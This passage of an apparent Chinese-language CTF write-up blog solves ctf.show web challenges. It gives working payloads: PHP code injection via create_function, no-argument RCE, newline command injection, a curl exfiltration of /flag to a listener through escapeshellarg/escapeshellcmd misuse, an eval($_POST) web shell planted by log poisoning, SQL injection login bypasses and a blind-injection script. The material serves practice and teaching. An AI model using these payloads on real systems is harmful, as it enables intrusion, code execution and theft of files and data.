class="string">&#x27;秀&#x27;</span>]))&#123;</span><br><span class="line">          <span class="keyword">die</span>(<span class="string">&#x27;必须是数字&#x27;</span>);</span><br><span class="line">       &#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;秀&#x27;</span>] &lt; <span class="number">60</span> * <span class="number">60</span> * <span class="number">24</span> * <span class="number">30</span> * <span class="number">2</span>)&#123;</span><br><span class="line">          <span class="keyword">die</span>(<span class="string">&#x27;你太短了&#x27;</span>);</span><br><span class="line">       &#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;秀&#x27;</span>] &gt; <span class="number">60</span> * <span class="number">60</span> * <span class="number">24</span> * <span class="number">30</span> * <span class="number">3</span>)&#123;</span><br><span class="line">           <span class="keyword">die</span>(<span class="string">&#x27;你太长了&#x27;</span>);</span><br><span class="line">       &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">           sleep((<span class="keyword">int</span>)<span class="variable">$_GET</span>[<span class="string">&#x27;秀&#x27;</span>]);</span><br><span class="line">           <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">echo</span> <span class="string">&#x27;&lt;hr&gt;&#x27;</span>;</span><br><span class="line">   &#125;</span><br><span class="line">   highlight_file(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure>

<p>秀要大于60 * 60 * 24 * 30 * 2，同时int后时间不能太久sleep((int)$_GET[‘秀’]);</p>
<p>payload：秀=0.7e7 =7000000 int后=0.7</p>
<p>或者16进制绕过：?秀=0x76a699</p>
<h2 id="web684"><a href="#web684" class="headerlink" title="web684"></a>web684</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$action</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;action&#x27;</span>] ?? <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$arg</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;arg&#x27;</span>] ?? <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/^[a-z0-9_]*$/isD&#x27;</span>, <span class="variable">$action</span>)) &#123; <span class="comment">//传入的参数不能有a-z0-9，这里只能识别一行只需要换行就能绕过正则</span></span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$action</span>(<span class="string">&#x27;&#x27;</span>, <span class="variable">$arg</span>);  <span class="comment">//这里可以使用create_function() 函数</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>不用字母数字以及下划线的情况下如何调用函数，看到 <code>^$</code> 应该想到 fuzz 一下开头和结尾的特殊字符的，正确的解法是在函数前面\或者%5c,<code>\function</code>。P牛在小密圈给出的解释是：</p>
<p>奇技淫巧 其实简单的不行，php里默认命名空间是 \，所有原生函数和类都在这个命名空间中。普通调用一个函数，如果直接写函数名function_name()调用，调用的时候其实相当于写了一个相对路径；而如果写\function_name() 这样调用函数，则其实是写了一个绝对路径。 如果你在其他namespace里调用系统类，就必须写绝对路径这种写法。</p>
<p>接下来需要找到某个函数第二个参数可控时可以利用的。函数<code>create_function()</code>非常合适，这里做一下记录<a target="_blank" rel="noopener" href="http://blog.51cto.com/lovexm/1743442">create_function()代码注入</a></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">string</span> create_function    ( <span class="keyword">string</span> <span class="variable">$args</span>   , <span class="keyword">string</span> <span class="variable">$code</span>   )</span><br><span class="line"><span class="keyword">string</span> <span class="variable">$args</span> 变量部分</span><br><span class="line"><span class="keyword">string</span> <span class="variable">$code</span> 方法代码部分</span><br><span class="line"></span><br><span class="line">例如：</span><br><span class="line">create_function(<span class="string">&#x27;$fname&#x27;</span>,<span class="string">&#x27;echo $fname.&quot;Zhang&quot;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fT</span>(<span class="params"><span class="variable">$fname</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$fname</span>.<span class="string">&quot;Zhang&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">有问题的代码</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//02-8.php?id=2;&#125;phpinfo();/*</span></span><br><span class="line"><span class="variable">$id</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line"><span class="variable">$str2</span>=<span class="string">&#x27;echo  &#x27;</span>.<span class="variable">$a</span>.<span class="string">&#x27;test&#x27;</span>.<span class="variable">$id</span>.<span class="string">&quot;;&quot;</span>;</span><br><span class="line"><span class="variable">$f1</span> = create_function(<span class="string">&#x27;$a&#x27;</span>,<span class="variable">$str2</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">执行函数为：</span><br><span class="line">    <span class="comment">#源代码：</span></span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">fT</span>(<span class="params"><span class="variable">$a</span></span>) </span>&#123;</span><br><span class="line">          <span class="keyword">echo</span> <span class="string">&quot;test&quot;</span>.<span class="variable">$a</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">   注入后代码：</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">fT</span>(<span class="params"><span class="variable">$a</span></span>) </span>&#123;</span><br><span class="line">          <span class="keyword">echo</span> <span class="string">&quot;test&quot;</span>;&#125;</span><br><span class="line">          phpinfo();<span class="comment">/*;//此处为注入代码。</span></span><br><span class="line"><span class="comment">        &#125;</span></span><br></pre></td></tr></table></figure>

<p>最终 payload 为 </p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/?<span class="attribute">action</span>=\create_function&amp;arg=1;&#125;print_r(scandir(<span class="string">&#x27;/&#x27;</span>));//</span><br><span class="line">?<span class="attribute">action</span>=\create_function&amp;arg=1;&#125;highlight_file(<span class="string">&#x27;/secret_you_never_know&#x27;</span>);//</span><br><span class="line">注释掉后面的;&#125;</span><br></pre></td></tr></table></figure>

<h2 id="web686"><a href="#web686" class="headerlink" title="web686"></a>web686</h2><p><img src="/2022/03/31/CTF%E5%A4%A7%E8%B5%9B%E5%8E%9F%E9%A2%98/image-20220331202817135.png" alt="image-20220331202817135"></p>
<p>无参数rce</p>
<p>这串代码就是检查了我们通过GET方式传入的参数的值，代码会将$_GET[‘code’]中满足正则的部分，替换为空，然后查看是否剩下的部分强等于‘;’。如果满足，则执行eval。</p>
<figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-attr">[^\W]</span>+\((?R)?\)</span><br><span class="line"> 首先是<span class="selector-attr">[^\W]</span></span><br><span class="line">对于\<span class="selector-tag">W</span>,其意思等价于<span class="selector-attr">[^A-Za-z0-9_]</span>。</span><br><span class="line">那么我们知道，我们的<span class="selector-tag">input</span>必须以此开头</span><br><span class="line">然后是括号匹配\( ...... \)</span><br><span class="line">(?R)?：意思为重复整个模式。但我们不能加参数,否则将无法匹配</span><br></pre></td></tr></table></figure>

<p>如果替换后的字符串只剩下 ; ,那么我们传进去的 exp 就会被 eval 执行。比如我们传入一个 phpinfo();，那么就会执行phpinfo()</p>
<p>因为代码中的正则表达式是循环执行的，所以我们也可以传入嵌套的无参函数。比如传入a(b(c()));，第一次匹配后，就剩a(b());，再匹配两次，就只剩下了 ; ，最后a(b(c()))就会被eval执行。</p>
<p>?code=eval(end(current(get_defined_vars())));&amp;get=system(‘cat /secret_you_never_know’);</p>
<p>get_defined_vars()：获取所有的已定义变量，返回值也是数组，二维数组；通过GET方式传入的参数会存在第一个数组中</p>
<p>current()，该函数可以返回数组中的单元且初始指针指向数组的第一个单元。因为GET方式传入的参数存在该二维数组中的第一个一维数组，所以我们可以通果这个函数将其取出来。一般我们的payload也是通过GET方式传入的，而我们要插入的恶意代码一般存在数组中的最后</p>
<p>end()：将数组内部指针指向最后一个单元并返回其值</p>
<h2 id="web687"><a href="#web687" class="headerlink" title="web687"></a>web687</h2><p><img src="/2022/03/31/CTF%E5%A4%A7%E8%B5%9B%E5%8E%9F%E9%A2%98/image-20220331205843602.png" alt="image-20220331205843602"></p>
<p>先是一个一个函数，接受一个$_REQUEST类型的变量。</p>
<p>这里百度一下，知道这玩意是$_POST、$_GET二合一版本，get和post变量它都能接受。</p>
<p>下面代码就是将传入的ip参数中的所有管道符和一些特殊符号用‘’替换。</p>
<p>最后，将替换的参数加到‘ping -c 1’ 后面当做shell指令执行。</p>
<p>并且输出执行结果。</p>
<p>很明显是一道注入题，要想办法绕过检测。</p>
<figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">输入<span class="number">127.0.0.1</span>得到：PING <span class="number">127.0.0.1</span> (<span class="number">127.0.0.1</span>): <span class="number">56</span> data bytes</span><br><span class="line"></span><br><span class="line">%<span class="number">0</span>a 没过滤，代表 换行符号</span><br><span class="line"></span><br><span class="line">shell指令执行的时候就是两句：</span><br><span class="line"></span><br><span class="line">ping -c <span class="number">1 127.0.0</span>.<span class="number">1</span></span><br><span class="line"></span><br><span class="line">ls</span><br><span class="line">输入?ip=<span class="number">127.0.0.1</span>%<span class="number">0</span>als /</span><br><span class="line">有个文件夹flaaag</span><br><span class="line">?ip=<span class="number">127.0.0.1</span>%<span class="number">0</span>acat /flaaag</span><br><span class="line">ctfshow&#123;<span class="number">4</span>f021aa9-<span class="number">1459</span>-<span class="number">446</span>e-<span class="number">9</span>a68-be7<span class="number">50d456a61</span>&#125;</span><br></pre></td></tr></table></figure>

<h2 id="web688"><a href="#web688" class="headerlink" title="web688"></a>web688</h2><p><img src="/2022/03/31/CTF%E5%A4%A7%E8%B5%9B%E5%8E%9F%E9%A2%98/image-20220331211454709.png" alt="image-20220331211454709"></p>
<p>通过curl把文件内容带出去，我们正常情况下可以使用<code>curl url -F file=@/flag</code></p>
<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">$url=escapeshellarg($url);</span><br><span class="line">$url=escapeshellcmd($url);</span><br><span class="line">escapeshellarg — 把字符串转码为可以在 shell 命令里使用的参数</span><br><span class="line">功能 ：escapeshellarg() 将给字符串增加一个单引号并且能引用或者转码任何已经存在的单引号，</span><br><span class="line">这样以确保能够直接将一个字符串传入 shell 函数，shell 函数包含 <span class="keyword">exec</span>(), <span class="keyword">system</span>() 执行运算符(反引号)</span><br><span class="line"></span><br><span class="line">escapeshellcmd — shell 元字符转义</span><br><span class="line">功能：escapeshellcmd() 对字符串中可能会欺骗 shell 命令执行任意命令的字符进行转义。</span><br><span class="line">此函数保证用户输入的数据在传送到 <span class="keyword">exec</span>() 或 <span class="keyword">system</span>() 函数，或者 执行操作符 之前进行转义。</span><br><span class="line">反斜线（\）会在以下字符之前插入：</span><br><span class="line">&amp;<span class="comment">#;`|\?~&lt;&gt;^()[]&#123;&#125;$*, \x0A 和 \xFF*。 *’ 和 “ 仅在不配对儿的时候被转义。</span></span><br><span class="line">在 Windows 平台上，所有这些字符以及 % 和 ! 字符都会被空格代替。</span><br><span class="line"></span><br><span class="line">escapeshellarg:将参数中的字符串两侧加上<span class="string">&#x27;,并将其中的&#x27;</span>进行转义 然后在两侧加上<span class="string">&#x27;达到拼接的目的</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">escapeshellcmd:将参数中的字符串中间的特殊字符转义,并且将落单的&#x27;</span>进行转义</span><br><span class="line"></span><br><span class="line">这两个函数本意都是防止进行额外的命令执行,但是这两个函数连在一起使用就会出现问题: escapeshellarg()+escapeshellcmd() 之殇</span><br><span class="line"></span><br><span class="line">也就是说两个函数连续使用会造成<span class="string">&#x27;未被转义,从而触发命令执行</span></span><br></pre></td></tr></table></figure>

<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">curl</span> http://a<span class="number">6</span>d<span class="number">6</span>fb<span class="number">94</span>-<span class="number">08</span>a<span class="number">3</span>-<span class="number">4</span>e<span class="number">95</span>-afa<span class="number">7</span>-<span class="number">3</span>f<span class="number">340</span>fb<span class="number">46</span>b<span class="number">68</span>.challenge.ctf.show/&#x27; -F file=@/flag &#x27;</span><br></pre></td></tr></table></figure>

<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; xxx -&gt;  &#x27;</span><span class="number">1</span><span class="string">&#x27;\&#x27;</span><span class="string">&#x27; xxx&#x27;</span> -&gt; <span class="string">&#x27;1&#x27;</span>\\<span class="string">&#x27;&#x27;</span> xxx\<span class="string">&#x27;</span></span><br><span class="line"><span class="string">具体内容可分为&#x27;</span><span class="number">1</span><span class="string">&#x27; \\ &#x27;</span><span class="string">&#x27; xxx \&#x27;</span>五部分</span><br><span class="line">两个反斜杠在一起就不再起到转义的作用了，也就是说我们可以逃出单引号。但是最后还多了个单引号，所以再写个就可以了，而其中的xxx就是我们要使用的内容</span><br><span class="line"><span class="built_in">curl</span> <span class="string">&#x27;url&#x27;</span> <span class="operator">-F</span> file=<span class="selector-tag">@</span>/flag</span><br><span class="line">payload:http://监听使用的ip:port/<span class="string">&#x27; -F file=@/flag&#x27;</span></span><br><span class="line"></span><br><span class="line">http://<span class="number">127.0</span>.<span class="number">0.1</span>:<span class="number">4589</span>/<span class="string">&#x27; -F file=@/flag &#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;http://127.0.0.1:4589/&#x27;</span>\<span class="string">&#x27;&#x27;</span> <span class="operator">-F</span> file=<span class="selector-tag">@</span>/flag \<span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;http://127.0.0.1:4589/&#x27;</span>\\<span class="string">&#x27;&#x27;</span> <span class="operator">-F</span> file=<span class="selector-tag">@</span>/flag \\<span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>







<h2 id="web系列"><a href="#web系列" class="headerlink" title="web系列"></a>web系列</h2><h2 id="web2"><a href="#web2" class="headerlink" title="web2"></a>web2</h2><p>万能密码登录成功：username=admin’ or 1=1#&amp;password=1</p>
<p>接下来为sql注入一系列操作（在username上操作）</p>
<h2 id="web3"><a href="#web3" class="headerlink" title="web3"></a>web3</h2><p><img src="/2022/03/31/CTF%E5%A4%A7%E8%B5%9B%E5%8E%9F%E9%A2%98/image-20220402202305918.png" alt="image-20220402202305918"></p>
<p>打开网站提示输入url，测试/etc/passwd成功显示，应为文件包含漏洞</p>
<p><strong>第一种方法：</strong><br> php伪协议中的data通过通配符查找目录下的所有文件</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url=data:<span class="comment">//text/plain,<span class="meta">&lt;?php</span> print_r(glob(&quot;*&quot;)); <span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>

<p><strong>第二种方法：</strong></p>
<p>php input协议</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">url=php:<span class="regexp">//i</span>nput</span><br><span class="line">再在bp下post任意命令执行</span><br></pre></td></tr></table></figure>

<h2 id="web4"><a href="#web4" class="headerlink" title="web4"></a>web4</h2><p>web3的方法不行了</p>
<p>日志包含<br>通过查看请求头可以知道服务器为nginx，nginx的log在/var/log/nginx/access.log和/var/log/nginx/error.log，其中access.log可以打开。<br>为了防止url编码，需要在burp中修改User-Agent为</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;hack&#x27;</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>接着菜刀或蚁剑连接。</p>
<h2 id="web5"><a href="#web5" class="headerlink" title="web5"></a>web5</h2><p>考察<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=md5&spm=1001.2101.3001.7020">md5</a>绕过，要求v1为为字母，v2为数字，并且v1与v2的md5值相同。</p>
<p>md5漏洞介绍：<br> PHP在处理<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=%E5%93%88%E5%B8%8C&spm=1001.2101.3001.7020">哈希</a>字符串时，它把每一个以“0E”开头的哈希值都解释为0<br> 所以只要v1与v2的md5值以0E开头即可。<br> v1=QNKCDZO&amp;v2=240610708</p>
<h2 id="web6"><a href="#web6" class="headerlink" title="web6"></a>web6</h2><p>1.尝试万能密码</p>
<pre><code>username=admin&#39; or 1=1#&amp;password=1
</code></pre>
<p>显示sql inject error，发现有字符被过滤。<br>逐个字符输入后发现过滤了空格，一般空格被过滤有如下替换方法<br>/**/<br>()<br>回车(url编码中的%0a)<br>`(tap键上面的按钮)<br>tap<br>两个空格</p>
<p>这里选择/**/</p>
<pre><code>username=admin&#39;/**/or/**/1=1#&amp;password=1
</code></pre>
<p>使用基本的sql注入模板获取flag</p>
<h2 id="web7"><a href="#web7" class="headerlink" title="web7"></a>web7</h2><p><img src="/2022/03/31/CTF%E5%A4%A7%E8%B5%9B%E5%8E%9F%E9%A2%98/image-20220402203012134.png" alt="image-20220402203012134"></p>
<p>首先判断注入点,输入以下payload,使SQL恒成立</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?id=<span class="number">1</span><span class="regexp">/**/</span>and<span class="regexp">/**/</span><span class="number">1</span>=<span class="number">1</span></span><br><span class="line">?id=<span class="number">1</span><span class="regexp">/**/</span>and<span class="regexp">/**/</span><span class="number">1</span>=<span class="number">2</span></span><br><span class="line">过滤了空格</span><br></pre></td></tr></table></figure>

<p>由此可以判断页面存在SQL注入,注入点为<strong>数值型注入</strong>,页面中有显示位,可以尝试<strong>联合注入</strong>进行脱库</p>
<p>使用基本的sql注入模板获取flag</p>
<h2 id="web8"><a href="#web8" class="headerlink" title="web8"></a>web8</h2><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">index</span>.php?id=<span class="number">0</span><span class="comment">/**/</span><span class="keyword">or</span><span class="comment">/**/</span><span class="number">1</span>=<span class="number">1</span>#</span><br><span class="line">网站过滤了<span class="keyword">union</span> 常规注入是不行了，那么进行布尔型盲注。</span><br><span class="line"></span><br><span class="line">题目对逗号进行了过滤，那么也有绕过姿势！</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27; and ascii(substr((select database()),1,1))=xx #</span></span><br><span class="line"><span class="string">这样的话写个脚本很容易跑出来了，过滤逗号之后可以变成这样</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;</span> <span class="keyword">and</span> ascii(substr((<span class="keyword">select</span> <span class="keyword">database</span>())<span class="keyword">from</span> <span class="number">1</span> <span class="keyword">for</span> <span class="number">1</span>))=xx #</span><br><span class="line">这是substr函数的两种用法</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>脚本如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">s = requests.session()</span><br><span class="line">url = <span class="string">&#x27;http://06eca5ec-5413-4f61-9072-d1a7ed12c667.challenge.ctf.show/index.php&#x27;</span></span><br><span class="line">table = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">45</span>):</span><br><span class="line">    <span class="built_in">print</span>(i)</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">31</span>, <span class="number">128</span>):</span><br><span class="line">        <span class="comment">#爆表名  flag</span></span><br><span class="line">        <span class="comment">#payload = &quot;ascii(substr((select/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema=database())from/**/&#123;0&#125;/**/for/**/1))=&#123;1&#125;#&quot;.format(i,j)</span></span><br><span class="line">        <span class="comment">#爆字段名 flag</span></span><br><span class="line">        <span class="comment">#payload = &quot;ascii(substr((select/**/group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_name=0x666C6167)from/**/%s/**/for/**/1))=%s#&quot;%(str(i),str(j))</span></span><br><span class="line">        <span class="comment">#读取flag</span></span><br><span class="line">        payload = <span class="string">&quot;ascii(substr((select/**/flag/**/from/**/flag)from/**/%s/**/for/**/1))=%s#&quot;</span>%(<span class="built_in">str</span>(i), <span class="built_in">str</span>(j))</span><br><span class="line"></span><br><span class="line">        ra = s.get(url=url + <span class="string">&#x27;?id=0/**/or/**/&#x27;</span> + payload).text</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;I asked nothing&#x27;</span> <span class="keyword">in</span> ra:</span><br><span class="line">            table += <span class="built_in">chr</span>(j)</span><br><span class="line">            <span class="built_in">print</span>(table)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure>

<h2 id="web9"><a href="#web9" class="headerlink" title="web9"></a>web9</h2><p>index.phps,查看源码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">        <span class="variable">$flag</span>=<span class="string">&quot;&quot;</span>;</span><br><span class="line">		<span class="variable">$password</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">		<span class="keyword">if</span>(strlen(<span class="variable">$password</span>)&gt;<span class="number">10</span>)&#123;</span><br><span class="line">			<span class="keyword">die</span>(<span class="string">&quot;password error&quot;</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="variable">$sql</span>=<span class="string">&quot;select * from user where username =&#x27;admin&#x27; and password =&#x27;&quot;</span>.md5(<span class="variable">$password</span>,<span class="literal">true</span>).<span class="string">&quot;&#x27;&quot;</span>;</span><br><span class="line">		<span class="variable">$result</span>=mysqli_query(<span class="variable">$con</span>,<span class="variable">$sql</span>);</span><br><span class="line">			<span class="keyword">if</span>(mysqli_num_rows(<span class="variable">$result</span>)&gt;<span class="number">0</span>)&#123;</span><br><span class="line">					<span class="keyword">while</span>(<span class="variable">$row</span>=mysqli_fetch_assoc(<span class="variable">$result</span>))&#123;</span><br><span class="line">						 <span class="keyword">echo</span> <span class="string">&quot;登陆成功&lt;br&gt;&quot;</span>;</span><br><span class="line">						 <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">					 &#125;</span><br><span class="line">			&#125;</span><br><span class="line">    <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>$sql=”select * from user where username =’admin’ and password =’”.md5($password,true).”‘“;<br>对于函数md5(string,raw)<br>第二个参数有以下可选项：<br>TRUE - 原始 16 字符二进制格式<br>FALSE - 默认。32 字符十六进制数<br>所以只要md5加密后的16进制转化为二进制时有 ‘or’xxxx，即可构成闭合语句： username =’admin’ and password =‘ ’or ‘xxxxx’ 成功登陆<br>这里给出两个符合的字符串<br> ffifdyop<br> 129581926211651571912466741651878684928<br> 但题目有长度限制，所以输入ffifdyop即可获取flag</p>
<h2 id="web10"><a href="#web10" class="headerlink" title="web10"></a>web10</h2><p>点击取消按钮，下载index.phps</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">		<span class="variable">$flag</span>=<span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">replaceSpecialChar</span>(<span class="params"><span class="variable">$strParam</span></span>)</span>&#123;</span><br><span class="line">             <span class="variable">$regex</span> = <span class="string">&quot;/(select|from|where|join|sleep|and|\s|union|,)/i&quot;</span>;</span><br><span class="line">             <span class="keyword">return</span> preg_replace(<span class="variable">$regex</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$strParam</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="variable">$con</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;Could not connect: &#x27;</span> . mysqli_error());</span><br><span class="line">        &#125;</span><br><span class="line">		<span class="keyword">if</span>(strlen(<span class="variable">$username</span>)!=strlen(replaceSpecialChar(<span class="variable">$username</span>)))&#123;</span><br><span class="line">			<span class="keyword">die</span>(<span class="string">&quot;sql inject error&quot;</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span>(strlen(<span class="variable">$password</span>)!=strlen(replaceSpecialChar(<span class="variable">$password</span>)))&#123;</span><br><span class="line">			<span class="keyword">die</span>(<span class="string">&quot;sql inject error&quot;</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="variable">$sql</span>=<span class="string">&quot;select * from user where username = &#x27;<span class="subst">$username</span>&#x27;&quot;</span>;</span><br><span class="line">		<span class="variable">$result</span>=mysqli_query(<span class="variable">$con</span>,<span class="variable">$sql</span>);</span><br><span class="line">			<span class="keyword">if</span>(mysqli_num_rows(<span class="variable">$result</span>)&gt;<span class="number">0</span>)&#123;</span><br><span class="line">					<span class="keyword">while</span>(<span class="variable">$row</span>=mysqli_fetch_assoc(<span class="variable">$result</span>))&#123;</span><br><span class="line">						<span class="keyword">if</span>(<span class="variable">$password</span>==<span class="variable">$row</span>[<span class="string">&#x27;password&#x27;</span>])&#123;</span><br><span class="line">							<span class="keyword">echo</span> <span 